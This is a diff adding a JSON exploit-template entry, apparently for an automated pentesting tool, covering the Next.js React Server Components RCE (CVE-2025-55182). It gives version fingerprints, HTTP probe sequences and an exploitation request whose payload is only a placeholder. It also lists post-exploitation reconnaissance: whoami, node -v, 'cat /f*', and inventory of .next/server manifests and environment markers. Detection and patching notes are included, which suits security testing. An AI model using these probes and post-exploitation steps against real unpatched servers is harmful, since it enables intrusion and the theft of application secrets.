@@ -1,0 +1,167 @@
+{
+  "id": "nextjs-cve-2025-55182-react-flight-rce",
+  "family": "nextjs",
+  "product": "Next.js",
+  "cve": "CVE-2025-55182",
+  "aliases": [
+    "React2Shell",
+    "Next.js React Flight protocol RCE",
+    "Next.js CVE-2025-66478"
+  ],
+  "severity": "critical",
+  "tags": [
+    "nextjs",
+    "react",
+    "rsc",
+    "app-router",
+    "server-actions",
+    "flight",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      ">= 14.3.0-canary.77, < 15.0.5",
+      ">= 15.1.0-canary.0, < 15.1.9",
+      ">= 15.2.0-canary.0, < 15.2.6",
+      ">= 15.3.0-canary.0, < 15.3.6",
+      ">= 15.4.0-canary.0, < 15.4.8",
+      ">= 15.5.0-canary.0, < 15.5.7",
+      ">= 16.0.0-canary.0, < 16.0.7"
+    ],
+    "fingerprints": [
+      "Next.js App Router is in use rather than a Pages Router-only deployment",
+      "GET /{app_route}?_rsc={cache_buster} with RSC headers returns text/x-component or another React Flight response",
+      "POST Server Action fetches are handled on page routes via the next-action header"
+    ],
+    "signals": [
+      "Responses show text/x-component, _rsc cache-busting behavior, or x-nextjs-* headers associated with App Router traffic",
+      "Malformed or invalid Server Action probes trigger Next.js-specific action parsing errors or x-nextjs-action-not-found",
+      "The deployment has not yet been upgraded to 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 or later"
+    ]
+  },
+  "preconditions": [
+    "The target must run a vulnerable Next.js release that uses the App Router and affected React Server Components packages.",
+    "Attacker-controlled requests must reach the Node-side RSC / Server Action handling path without an upstream proxy stripping Next.js-specific headers.",
+    "At minimum a reachable RSC surface must exist; some exploit paths additionally require a callable Server Function or Action surface on the chosen route.",
+    "Do not rely on hosting-provider WAF behavior as proof of safety; official advisories require patching even when temporary mitigations are present."
+  ],
+  "verification": {
+    "method": "http_sequence",
+    "requests": [
+      {
+        "path": "/{app_route}?_rsc={cache_buster}",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "text/x-component",
+          "RSC": "1",
+          "Next-Router-State-Tree": "{serialized_router_state}",
+          "Next-Url": "/{app_route}"
+        },
+        "data": "",
+        "matchers": [
+          "Content-Type starts with text/x-component",
+          "Response body resembles React Flight / RSC frames or a digest-style parser error",
+          "Redirects or rewrites still preserve App Router / _rsc behavior"
+        ]
+      },
+      {
+        "path": "/{app_route}",
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "text/x-component",
+          "Content-Type": "text/plain;charset=UTF-8",
+          "Origin": "{target_origin}",
+          "RSC": "1",
+          "Next-Action": "{candidate_action_id}"
+        },
+        "data": "[]",
+        "matchers": [
+          "x-nextjs-action-not-found: 1 or another Next.js Server Action handling branch is triggered",
+          "404 or 500 responses still reference action parsing rather than a generic route handler"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/{app_route}",
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "text/x-component",
+          "Content-Type": "text/plain;charset=UTF-8",
+          "Origin": "{target_origin}",
+          "RSC": "1",
+          "Next-Action": "{action_id}"
+        },
+        "data": "{validated_react_flight_payload_execute_cmd:{cmd}}",
+        "matchers": [
+          "Substitute {cmd} only after the RSC surface and action parsing path are confirmed in an authorized environment",
+          "For low-noise validation, start with a harmless command placeholder rather than a long post-exploitation sequence"
+        ],
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "Keep the first proof minimal: verify execution context with whoami, hostname, pwd, node -v, and only then inspect application internals.",
+      "Prioritize .next/server artifacts, server-reference manifests, route manifests, and deployment metadata before attempting noisier actions.",
+      "If the target was exposed before patching, assume secrets may already be at risk; any defensive remediation workflow should include credential and token rotation."
+    ],
+    "shell_options": [
+      {
+        "type": "authorized_cmd_slot",
+        "template": "Reuse the validated request shape and replace {cmd} with the single authorized command you want to test in your lab environment."
+      },
+      {
+        "type": "node_runtime_probe",
+        "template": "Embed a low-noise runtime probe such as `node -v && whoami && pwd && ls -la .next` in the validated React flight payload."
+      },
+      {
+        "type": "next_manifest_inventory",
+        "template": "Use the same execution primitive to inventory `.next/server`, action manifests, and environment markers before escalating further."
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "First prove the RSC surface with a harmless GET probe that returns text/x-component.",
+      "Then confirm Server Action parsing with a benign next-action probe instead of jumping straight to command execution.",
+      "Once the route and action path are confirmed, substitute the smallest possible `{cmd}` value and collect version / runtime context before any heavier follow-up."
+    ],
+    "commands": [
+      "id",
+      "whoami",
+      "hostname",
+      "pwd",
+      "node -v",
+      "cat /f*"
+    ],
+    "shell_prerequisites": [
+      "Confirm the selected route is served by the App Router and not rewritten to a Pages Router-only path.",
+      "Confirm Origin / Host handling, reverse proxies, and middleware do not reject handcrafted Server Action requests before they reach Next.js.",
+      "Prefer targets where the response behavior clearly proves RSC or Server Action parsing, even if the first probe only yields an error frame."
+    ],
+    "fallbacks": [
+      "If one route does not expose RSC behavior, probe other App Router routes or route groups before ruling the target out.",
+      "If invalid next-action probes are normalized away by middleware, fall back to GET-based RSC surface confirmation and version fingerprinting.",
+      "If the deployment sits behind a temporary provider mitigation, treat it as a blocker for exploitation but not as evidence that the underlying version is patched."
+    ]
+  },
+  "detection_notes": [
+    "Official advisories warn that hosting-provider WAF rules were only temporary mitigations and should not be treated as a substitute for patching.",
+    "Useful log and telemetry markers include _rsc, rsc, next-action, text/x-component, and x-nextjs-action-not-found.",
+    "Malformed probes may still return 404 or 500 while proving the request reached Next.js's RSC / Server Action parser."
+  ],
+  "references": [
+    "React blog: Critical Security Vulnerability in React Server Components (CVE-2025-55182)",
+    "GitHub Advisory GHSA-9qr9-h5gf-34mp for Next.js",
+    "Next.js Security Advisory CVE-2025-66478",
+    "Vercel changelog: Summary of CVE-2025-55182"
+  ]
+}
